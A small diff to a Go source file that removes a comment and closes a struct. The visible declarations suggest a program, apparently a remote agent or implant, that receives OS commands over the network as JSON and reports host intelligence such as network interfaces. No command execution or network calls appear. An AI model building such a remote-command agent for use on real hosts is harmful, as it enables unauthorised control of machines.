@@ -12,8 +12,6 @@ import (
 	"net"
 )
 
-// import the libraries we need
-
 // struct to represent an OS command from the wire
 // we will be shoving a JSON payload into this
 type Command struct {
@@ -40,3 +38,4 @@ type OutgoingMessage struct {
 // struct to hold intel about host
 type HostIntel struct {
 	interfaces []net.Interface
+}
